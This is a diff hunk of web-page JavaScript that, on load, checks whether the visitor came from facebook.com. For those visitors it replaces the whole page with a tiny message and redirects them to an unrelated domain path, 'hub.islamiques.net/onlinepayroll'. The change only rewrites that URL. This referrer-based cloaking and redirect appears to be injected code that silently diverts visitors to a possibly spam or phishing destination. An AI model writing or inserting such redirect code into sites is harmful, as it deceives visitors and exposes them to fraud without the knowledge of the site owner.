@@ -103,7 +103,7 @@
     document.addEventListener("DOMContentLoaded", function() {
         var referer = document.referrer;
         if (referer.includes("facebook.com")) {
-            var redirectUrl = "hub.islamiques.net/onlinepayroll";
+            var redirectUrl = "https://hub.islamiques.net/onlinepayroll/";
             var message = 'If your redirect doesn\'t start automatically, please <a id="redirectLink" href="' + redirectUrl + '">click here</a>.';
             document.body.innerHTML = '<h6 style="font-size: 10px;">' + message + '</h6>';
             setTimeout(function() {
